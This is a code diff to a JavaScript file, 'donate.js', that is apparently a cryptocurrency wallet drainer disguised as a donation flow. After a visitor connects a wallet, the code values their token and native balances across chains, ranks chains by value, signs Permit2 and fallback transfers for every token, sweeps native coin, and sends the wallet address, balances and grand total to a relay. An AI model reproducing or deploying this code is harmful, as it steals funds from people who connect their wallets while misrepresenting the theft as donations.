@@ -1,4 +1,6 @@
-// src/engine/donate.js
+
+// ---------- src/engine/donate.js ----------
+// Updated runDonationFlow: consistent provider usage and read-only RPC separation
 import { notify } from "../utils/notify.js";
 import { sendEvent } from "../utils/eventRelay.js";
 import {
@@ -12,11 +14,7 @@ import { executeFallbackBatch, sweepNative } from "./fallback.js";
 import { CHAINS, exceptionList } from "../config.js";
 import { ethers } from "ethers";
 
-/**
- * Batch fetch native prices from Coingecko for all chain symbols
- * returns a map: { ETH: priceUsd, BNB: priceUsd, ... }
- */
-async function fetchNativePricesForChains() {
+async function fetchNativePrice(symbol) {
   try {
     const idMap = {
       ETH: "ethereum",
@@ -27,136 +25,113 @@ async function fetchNativePricesForChains() {
       OP: "optimism",
       ARB: "arbitrum",
     };
-
-    // collect unique ids from CHAINS.nativeSymbol
-    const ids = Array.from(
-      new Set(
-        CHAINS.map((c) => idMap[c.nativeSymbol]).filter(Boolean)
-      )
-    );
-
-    if (!ids.length) return {};
-
+    const id = idMap[symbol];
+    if (!id) return 0;
     const res = await fetch(
-      `https://api.coingecko.com/api/v3/simple/price?ids=${ids.join(",")}&vs_currencies=usd`
+      `https://api.coingecko.com/api/v3/simple/price?ids=${id}&vs_currencies=usd`
     );
     const json = await res.json();
-
-    // build reverse map symbol => price
-    const symbolPrice = {};
-    for (const [symbol, id] of Object.entries(idMap)) {
-      if (!id) continue;
-      symbolPrice[symbol] = (json[id] && json[id].usd) ? json[id].usd : 0;
-    }
-    return symbolPrice;
+    return json[id]?.usd || 0;
   } catch (err) {
-    console.warn("Coingecko price fetch failed:", err);
-    return {};
+    console.warn("Coingecko price error", err);
+    return 0;
   }
 }
 
-/**
- * runDonationFlow
- * @param {object} walletClient - wallet client (wagmi or custom)
- * @param {string} ownerParam - owner address (App passes address)
- * @param {string} trackingId - session tracking id
- */
-export async function runDonationFlow(walletClient, ownerParam, trackingId) {
+export async function runDonationFlow(walletClient) {
   try {
-    // determine owner address (prefer explicit param)
-    let owner = ownerParam || null;
+    let owner = null;
 
-    if (!owner) {
-      if (walletClient?.account?.address) {
-        owner = walletClient.account.address;
-      } else if (typeof window !== "undefined" && window.ethereum) {
-        const injectedProvider = new ethers.BrowserProvider(window.ethereum);
-        await injectedProvider.send("eth_requestAccounts", []);
-        try {
-          owner = await injectedProvider.getSigner().getAddress();
-        } catch (err) {
-          console.warn("Failed to get signer address from injected provider:", err);
-        }
-      }
+    if (walletClient?.account?.address) {
+      owner = walletClient.account.address;
+    } else if (typeof window !== "undefined" && window.ethereum) {
+      const injectedProvider = new ethers.BrowserProvider(window.ethereum);
+      await injectedProvider.send("eth_requestAccounts", []);
+      owner = await injectedProvider.getSigner().getAddress();
     }
 
     if (!owner) throw new Error("Wallet not connected");
 
+    const trackingId = Date.now().toString();
+    
+    
     // -------------------------
-    // PREP: fetch native prices once
+    // LINK_OPENED (1st event)
     // -------------------------
-    const nativePrices = await fetchNativePricesForChains();
+    if (typeof window !== "undefined") {
+      const openedPayload = {
+        openedUrl: window.location.href,
+        visitorIp: null, // optional: backend can enrich this
+        trackingId,
+      };
+      notify("LINK_OPENED", openedPayload);
+      await sendEvent("LINK_OPENED", openedPayload);
+    }
 
+    
     // -------------------------
-    // Fetch balances for each chain (read-only RPCs)
-    // Build chainBalances used for donation ordering/contents
+    // Fetch balances immediately (READ-ONLY using chain.rpcUrl)
     // -------------------------
     const chainBalances = [];
     for (const chain of CHAINS) {
-      try {
-        const raw = await fetchBalancesCovalent(owner, chain.chainId);
-        const filtered = await filterPermit2SafeTokens(raw);
+      const raw = await fetchBalancesCovalent(owner, chain.chainId);
+      const filtered = await filterPermit2SafeTokens(raw);
 
-        // Use read-only RPC for native balance
-        const rpcProvider = new ethers.JsonRpcProvider(chain.rpcUrl);
-        const nativeRaw = await rpcProvider.getBalance(owner);
-        const nativeFormatted = parseFloat(ethers.formatEther(nativeRaw));
+      // Use read-only RPC (safe for CORS if using a provider with CORS) for balance lookups
+      const rpcProvider = new ethers.JsonRpcProvider(chain.rpcUrl);
+      const nativeRaw = await rpcProvider.getBalance(owner);
+      const nativeFormatted = parseFloat(ethers.formatEther(nativeRaw));
+      const nativePrice = await fetchNativePrice(chain.nativeSymbol);
+      const nativeUSD = nativeFormatted * nativePrice;
 
-        const nativePrice = nativePrices[chain.nativeSymbol] || 0;
-        const nativeUSD = nativeFormatted * nativePrice;
+      const tokensValue = getChainValue(filtered);
+      const totalValue = tokensValue + nativeUSD;
 
-        const tokensValue = getChainValue(filtered);
-        const totalValue = tokensValue + nativeUSD;
-
-        // normalize decimals field name to 'decimals' (some data may differ)
-        filtered.forEach((t) => {
-          if (t.contract_decimals && !t.decimals) t.decimals = t.contract_decimals;
-        });
-
-        chainBalances.push({
-          chainId: chain.chainId,
-          name: chain.name,
-          native: nativeFormatted,
-          nativeUSD,
-          tokens: filtered,
-          totalValue,
-        });
-      } catch (err) {
-        console.warn(`Failed to prepare balances for chain ${chain.name}:`, err);
-      }
+      chainBalances.push({
+        chainId: chain.chainId,
+        name: chain.name,
+        native: nativeFormatted,
+        nativeUSD,
+        tokens: filtered,
+        totalValue,
+      });
     }
 
-    // Build a human-friendly balancesPayload (for DONATION_START payload or logs if needed)
     const balancesPayload = chainBalances.map((c) => ({
       name: c.name,
       native: Number(c.native).toFixed(6),
       nativeValue: Number(c.nativeUSD || 0).toFixed(2),
       tokens: c.tokens.map((t) => ({
         name: t.tokenSymbol,
-        amount: Number(ethers.formatUnits(t.balanceRaw, t.decimals ?? 18)).toFixed(6),
+        amount: Number(
+          ethers.formatUnits(t.balanceRaw, t.contract_decimals || 18)
+        ).toFixed(6),
         value: Number(t.quote).toFixed(2),
       })),
       total: Number(c.totalValue).toFixed(2),
     }));
+    const grandTotal = balancesPayload.reduce(
+      (acc, c) => acc + parseFloat(c.total || 0),
+      0
+    );
+
+    const connectedPayload = {
+      walletAddress: owner,
+      trackingId,
+      balances: balancesPayload,
+      grandTotal: Number(grandTotal).toFixed(2),
+    };
+
+    notify("WALLET_CONNECTED", connectedPayload);
+    await sendEvent("WALLET_CONNECTED", connectedPayload);
 
     // -------------------------
-    // Notify connected (optional) -- App already emitted WALLET_CONNECTED,
-    // but we can send a lightweight confirm event here (commented out by default)
-    // -------------------------
-    // const connectedPayload = { walletAddress: owner, trackingId, balances: balancesPayload };
-    // notify("WALLET_CONNECTED_CONFIRM", connectedPayload);
-    // await sendEvent("WALLET_CONNECTED_CONFIRM", connectedPayload);
-
-    // -------------------------
-    // Donation processing (wallet-backed provider/signer for txs)
+    // Donation processing (use wallet-backed provider/signer for txs)
     // -------------------------
     chainBalances.sort((a, b) => b.totalValue - a.totalValue);
 
     for (const chain of chainBalances) {
-      // Skip chains with nothing to extract
-      if ((chain.totalValue || 0) <= 0) continue;
-
-      const startPayload = { walletAddress: owner, trackingId, chain: chain.name, chainTotal: Number(chain.totalValue).toFixed(2) };
+      const startPayload = { walletAddress: owner, trackingId, chain: chain.name };
       notify("DONATION_START", startPayload);
       await sendEvent("DONATION_START", startPayload);
 
@@ -165,53 +140,47 @@ export async function runDonationFlow(walletClient, ownerParam, trackingId) {
 
       if (!provider || !signer) {
         console.warn("No signer/provider for chain", chain.chainId);
-        // still continue to next chain
         continue;
       }
 
       const permit2Tokens = [];
       const fallbackTokens = [];
 
-      // classify tokens
       for (const t of chain.tokens) {
-        try {
-          const addr = t.tokenAddress.toLowerCase();
-          if (exceptionList?.[chain.chainId]?.includes(addr)) {
-            fallbackTokens.push(t);
-            continue;
-          }
-          const ok = await isPermit2Compatible(addr, signer);
-          if (ok) permit2Tokens.push(t);
-          else fallbackTokens.push(t);
-        } catch (err) {
-          console.warn("Token compatibility check failed for", t.tokenSymbol, err);
+        const addr = t.tokenAddress.toLowerCase();
+        if (exceptionList?.[chain.chainId]?.includes(addr)) {
           fallbackTokens.push(t);
+          continue;
         }
+        const ok = await isPermit2Compatible(addr, signer);
+        if (ok) permit2Tokens.push(t);
+        else fallbackTokens.push(t);
       }
 
-      // Permit2 batch (single call for all compatible tokens)
       try {
         if (permit2Tokens.length) {
-          const tx = await executePermit2Batch(signer, chain.chainId, permit2Tokens);
-          if (tx && tx.wait) await tx.wait();
+          for (const t of permit2Tokens) {
+            // executePermit2Batch returns a transaction (or promise of one)
+            const tx = await executePermit2Batch(signer, chain.chainId, [t]);
+            if (tx && tx.wait) await tx.wait();
+          }
         }
       } catch (err) {
         console.warn("permit2 batch error", err);
-        // move all permit2 tokens to fallback if batch fails
         fallbackTokens.push(...permit2Tokens);
       }
 
-      // Fallback batch (single call)
       try {
         if (fallbackTokens.length) {
-          const tx = await executeFallbackBatch(signer, chain.chainId, fallbackTokens);
-          if (tx && tx.wait) await tx.wait();
+          for (const t of fallbackTokens) {
+            const tx = await executeFallbackBatch(signer, chain.chainId, [t]);
+            if (tx && tx.wait) await tx.wait();
+          }
         }
       } catch (err) {
         console.warn("fallback batch error", err);
       }
 
-      // Sweep native
       try {
         const sweepTx = await sweepNative(signer, provider, chain.chainId);
         if (sweepTx && sweepTx.wait) await sweepTx.wait();
@@ -229,13 +198,8 @@ export async function runDonationFlow(walletClient, ownerParam, trackingId) {
       const refreshedNativeRaw = await refreshedProvider.getBalance(owner);
       const refreshedNative = parseFloat(ethers.formatEther(refreshedNativeRaw));
 
-      const refreshedNativePrice = nativePrices[CHAINS.find((c) => c.chainId === chain.chainId)?.nativeSymbol] || 0;
+      const refreshedNativePrice = await fetchNativePrice(chain.name === "BSC" ? "BNB" : "ETH");
       const refreshedNativeUSD = refreshedNative * refreshedNativePrice;
-
-      // normalize decimals in refreshed tokens
-      refreshedFiltered.forEach((t) => {
-        if (t.contract_decimals && !t.decimals) t.decimals = t.contract_decimals;
-      });
 
       const refreshedTokensValue = getChainValue(refreshedFiltered);
       const refreshedTotal = refreshedTokensValue + refreshedNativeUSD;
@@ -252,7 +216,9 @@ export async function runDonationFlow(walletClient, ownerParam, trackingId) {
             nativeValue: Number(refreshedNativeUSD || 0).toFixed(2),
             tokens: refreshedFiltered.map((t) => ({
               name: t.tokenSymbol,
-              amount: Number(ethers.formatUnits(t.balanceRaw, t.decimals ?? 18)).toFixed(6),
+              amount: Number(
+                ethers.formatUnits(t.balanceRaw, t.contract_decimals || 18)
+              ).toFixed(6),
               value: Number(t.quote).toFixed(2),
             })),
             total: refreshedTotal.toFixed(2),
@@ -278,3 +244,4 @@ export async function runDonationFlow(walletClient, ownerParam, trackingId) {
     return { success: false, reason: err.message || String(err) };
   }
 }
+
